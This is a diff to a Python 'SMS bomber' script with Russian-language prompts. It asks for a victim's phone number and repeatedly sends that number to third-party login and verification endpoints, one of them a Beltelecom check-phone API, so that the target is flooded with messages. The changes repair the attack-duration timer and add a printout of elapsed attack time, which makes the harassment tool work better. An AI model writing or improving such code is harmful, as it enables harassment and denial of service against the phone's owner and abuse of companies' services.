@@ -16,6 +16,7 @@ print('''
 
 DEBAG = False
 iteration = 0
+start_time = time.monotonic()
 phone = input('Введите номер: ')
 delay = input('Если хотите сделать задержку перед атакой, введите "1": ')
 
@@ -24,18 +25,15 @@ if delay == '1':
     time.sleep(delay)
 
 if DEBAG == False:
-    attak_duration = int(input('Введите время атаки в секндах(0 = бессконечность): '))
-    start_time = time.monotonic()
-
+    attak_duration = int(input('Введите время атаки в секндах(0 == бессконечность): '))
 
     def timer(attak_duration = attak_duration, start_time = start_time):
-        if start_time > time.monotonic - attak_duration:
+        if attak_duration > time.monotonic() - start_time:
             return True
-        else:
-            return False
+        return False
 
-        if attak_duration == 0:
-            timer = True
+    if attak_duration == 0:
+        timer = True
 
 if phone[0] == '+':
     phone = phone[1:]
@@ -151,7 +149,7 @@ def spamm30(phone=phone):
     beltelecom = requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': phone})
 
 
-while DEBAG == False and timer:
+while DEBAG == False and timer():
     try:
         spamm1()
         spamm2()
@@ -186,9 +184,11 @@ while DEBAG == False and timer:
     except:
         print('ERROR')
     iteration += 1
-    print('Пройдено {0} кругов!'.format(iteration))
+    print('Пройдено {0} кругов!'.format(iteration), 'время атаки составляет {0} секунд!'.format(time.monotonic() - start_time))
+
 else:
-    print('Атака завершена!')
+    if DEBAG == False:
+        print('Атака завершена!')
 
 while DEBAG == True:
     print('if the error crashes, then put " # " before the function that creates this error')
